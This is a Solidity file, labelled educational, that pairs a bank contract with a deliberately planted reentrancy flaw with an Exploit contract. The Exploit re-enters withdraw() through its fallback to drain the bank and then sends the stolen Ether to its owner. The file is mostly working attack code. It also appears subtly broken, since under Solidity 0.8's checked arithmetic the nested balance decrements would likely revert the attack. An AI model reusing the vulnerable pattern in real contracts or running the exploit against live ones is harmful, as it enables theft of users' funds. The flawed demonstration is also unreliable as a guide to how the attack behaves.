// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title VulnerableBank
/// @notice A simple bank contract with a reentrancy vulnerability.
/// @dev This contract is intentionally vulnerable for educational purposes.
contract VulnerableBank {
    mapping(address => uint256) public balances;

    /// @notice Deposit Ether into the bank.
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Withdraw a specified amount of Ether.
    /// @dev Vulnerable to reentrancy because the state update occurs after transferring Ether.
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        // Transfer Ether to the sender before updating the balance.
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;
    }
}

/// @title Exploit
/// @notice Demonstrates a reentrancy attack on the VulnerableBank contract.
/// @dev This contract repeatedly calls the vulnerable withdraw function to drain funds.
contract Exploit {
    VulnerableBank public vulnerableBank;
    address public owner;

    /// @notice Constructor sets the target vulnerable bank.
    /// @param _vulnerableBankAddress The address of the VulnerableBank contract.
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    /// @notice Fallback function is triggered when Ether is received.
    /// It re-enters the vulnerable withdraw function if the bank has sufficient balance.
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    /// @notice Initiates the attack by depositing Ether and then calling withdraw.
    /// @dev The attack requires at least 1 Ether to start.
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 Ether to attack");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw(1 ether);
    }

    /// @notice Allows the owner to withdraw the stolen Ether.
    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }
}
